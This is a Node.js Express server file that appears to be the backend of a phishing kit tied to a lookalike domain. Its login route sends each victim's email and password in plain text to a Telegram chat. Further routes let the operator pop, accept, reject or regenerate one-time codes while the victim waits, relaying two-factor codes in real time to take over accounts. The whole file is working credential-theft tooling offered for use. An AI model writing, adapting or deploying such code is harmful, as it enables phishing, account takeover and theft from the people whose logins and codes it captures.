require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const bot = require('./bot');
const otpStore = require('./otpStore'); // Serves as sessionStore

const app = express();
const PORT = process.env.PORT || 5001;

// Enable Helmet HTTP security headers
app.use(helmet());

// Disable X-Powered-By header to prevent technology disclosure
app.disable('x-powered-by');

// Define allowed CORS origins
const allowedOrigins = [
  'https://centre-profi1-nationa1.com',
  'https://www.centre-profi1-nationa1.com'
];

if (process.env.FRONTEND_URL) {
  allowedOrigins.push(process.env.FRONTEND_URL);
}

app.use(cors({
  origin: allowedOrigins,
  credentials: true
}));

// Apply general API rate limiting (max 150 requests per 15 minutes per IP)
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 150,
  message: { success: false, error: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', apiLimiter);

// Stricter rate limiter for sensitive authentication entrypoints
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15, // limit each IP to 15 login attempts per 15 minutes
  message: { success: false, error: 'Too many login attempts. Please try again after 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/login', loginLimiter);

app.use(express.json());

// =============================================
// ACCESS KEY PROTECTION
// =============================================
const VALID_ACCESS_KEY = 'client';

app.use('/api/', (req, res, next) => {
  const userKey = req.query.key || req.headers['x-access-key'];
  if (!userKey || userKey !== VALID_ACCESS_KEY) {
    return res.status(403).json({ success: false, error: 'Access Denied. Invalid or missing access key.' });
  }
  next();
});

// Helper for formatted IST time
function getISTDateTime() {
  const date = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istDate = new Date(date.getTime() + istOffset);
  const pad = (num) => String(num).padStart(2, '0');
  return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
}

// Flow 1 — Login Credentials Notification
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'Email and password are required' });
  }

  const timestamp = getISTDateTime();
  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Time: ${timestamp}`;
  
  const reply_markup = {
    inline_keyboard: [
      [
        { text: '📤 POP OTP', callback_data: `pop_otp:${email}` },
        { text: '❌ CANCEL', callback_data: `cancel:${email}` }
      ]
    ]
  };

  // Initialize the session state
  otpStore[email] = {
    email,
    password,
    status: 'login_submitted',
    otp: null,
    otpExpiry: null,
    otpEntered: null,
    redirectUrl: null
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] Received login attempt for ${email}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send login attempt message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// GET /api/session-status — Long-polling check for state updates
app.get('/api/session-status', (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email query parameter is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.json({ success: true, status: 'idle' });
  }

  return res.json({
    success: true,
    status: session.status,
    otp: session.otp,
    otpExpiry: session.otpExpiry,
    redirectUrl: session.redirectUrl
  });
});

// POST /api/submit-otp — User submits the typed OTP
app.post('/api/submit-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) {
    return res.status(400).json({ success: false, error: 'Email and OTP are required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Update session state
  session.status = 'otp_submitted';
  session.otpEntered = otp;

  const timestamp = getISTDateTime();
  const message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;

  const reply_markup = {
    inline_keyboard: [
      [
        { text: '✅ ACCEPT OTP', callback_data: `accept_otp:${email}` },
        { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` }
      ],
      [
        { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` },
        { text: '❌ CANCEL', callback_data: `cancel:${email}` }
      ]
    ]
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] User ${email} submitted OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send OTP entered message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// POST /api/request-resend — User requested a new OTP code
app.post('/api/request-resend', async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Generate a new 6-digit OTP code immediately
  const crypto = require('crypto');
  const otp = crypto.randomInt(100000, 999999).toString();

  session.status = 'show_otp';
  session.otp = otp;
  session.otpExpiry = Date.now() + 60000; // Reset to 60 seconds

  const timestamp = getISTDateTime();
  try {
    await bot.sendMessage(
      process.env.ADMIN_CHAT_ID,
      `⚠️ USER REQUESTED RESEND (New OTP Generated)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timestamp}`
    );
    console.log(`[Express] User ${email} requested OTP resend. New OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send resend request message to Telegram:', error.message);
  }
  return res.json({ success: true });
});

// POST /api/clear-session — Clean up session after successful verification
app.post('/api/clear-session', (req, res) => {
  const { email } = req.body;
  if (email && otpStore[email]) {
    delete otpStore[email];
    console.log(`[Express] Session successfully cleared for ${email}`);
  }
  return res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(`Backend server is running on http://localhost:${PORT}`);
});
